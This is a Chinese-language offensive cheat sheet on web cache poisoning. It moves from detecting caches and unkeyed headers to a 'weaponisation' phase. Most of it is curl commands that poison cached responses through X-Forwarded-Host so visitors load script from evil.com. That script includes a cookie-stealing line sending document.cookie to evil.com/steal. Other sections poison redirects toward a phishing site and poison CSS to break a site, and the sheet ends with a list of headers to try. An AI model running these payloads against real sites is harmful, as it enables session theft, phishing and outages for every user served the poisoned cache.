# Web Cache Poisoning (缓存投毒) 实战参考

> 阶段分离: [攻击] 检测缓存行为+未键化头部 → [利用] 投毒XSS/重定向/拒绝服务

---

# 攻击阶段 — 检测与识别

## 1. 识别缓存行为

```bash
# === 检测是否有缓存 ===
curl -I https://target.com/ | grep -E "Cache|X-Cache|CF-Cache|Age|Via"

# 常见缓存头:
# X-Cache: HIT / MISS / HIT from xxx
# CF-Cache-Status: HIT
# Age: 123
# Cache-Control: public, max-age=...
```

### 1.1 缓存键识别

```
缓存键 = Host + Path + QueryString (部分)
非键化 = 其他headers + body

投毒原理: 修改非键化输入 → 响应被缓存 → 后续用户拿到被篡改的响应
```

### 1.2 找非键化输入

```bash
# 对每个请求头测试 → 看是否影响响应
curl -H "X-Forwarded-Host: evil.com" https://target.com/
curl -H "X-Forwarded-Scheme: http" https://target.com/
curl -H "X-Forwarded-For: 1.1.1.1" https://target.com/
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Rewrite-URL: /admin" https://target.com/

# 如果响应中的URL/内容被修改 → 非键化输入确认
```

---

# 利用阶段 — 武器化

## 2. XSS via 缓存投毒

```bash
# 场景: 页面反射 X-Forwarded-Host 到script标签中
# 正常: <script src="https://target.com/js/app.js">

# 投毒:
curl -H "X-Forwarded-Host: evil.com" https://target.com/

# 缓存的响应: <script src="https://evil.com/js/app.js">
# → 所有访问者加载攻击者的JS → XSS

# 攻击者服务器上的 /js/app.js:
# document.location='http://evil.com/steal?c='+document.cookie
```

## 3. 重定向投毒

```bash
# 场景: 响应中重定向的Host来自请求头
# 正常: 302 → Location: https://target.com/login

# 投毒:
curl -H "X-Forwarded-Host: evil.com" https://target.com/redirect-here

# 缓存的响应: 302 → Location: https://evil.com/login
# → 所有用户被重定向到钓鱼站
```

## 4. DoS via 缓存投毒

```bash
# 场景: 让关键资源缓存错误内容
curl -H "X-Forwarded-Host: 0" https://target.com/style.css
# → 响应含404页面 → 缓存 → 全站CSS崩溃
```

## 5. 常用非键化头部列表

```bash
# 投毒测试清单:
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Forwarded-Port: 8080
X-Forwarded-Proto: http
X-Forwarded-For: evil.com
X-Original-URL: /xss
X-Rewrite-URL: /xss
X-HTTP-Method-Override: PUT
X-Forwarded-Server: evil.com
Origin: https://evil.com
Referer: https://evil.com
```

---

*参考: PortSwigger Web Cache Poisoning + 实战案例*
